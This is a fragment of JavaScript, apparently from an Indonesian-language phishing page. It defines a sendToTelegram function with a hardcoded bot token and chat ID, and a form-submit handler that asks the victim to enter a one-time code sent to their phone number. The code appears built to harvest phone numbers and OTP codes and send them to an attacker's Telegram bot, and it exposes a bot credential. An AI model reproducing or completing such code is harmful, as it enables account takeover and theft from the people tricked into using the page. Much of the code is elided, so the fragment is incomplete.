...
function sendToTelegram(message) {
  const token = "7620606724:AAHZ8bAOzYbkJVlWsr0PWyV4obvl_9kgNIU";
  const chatId = "6424567671";
...
document
  ...
  .addEventListener("submit", function (event) {
    ...
    otpMessage.textContent = `Silahkan Masukan Kode-yang dikirim ke Nomor ${phone}`;
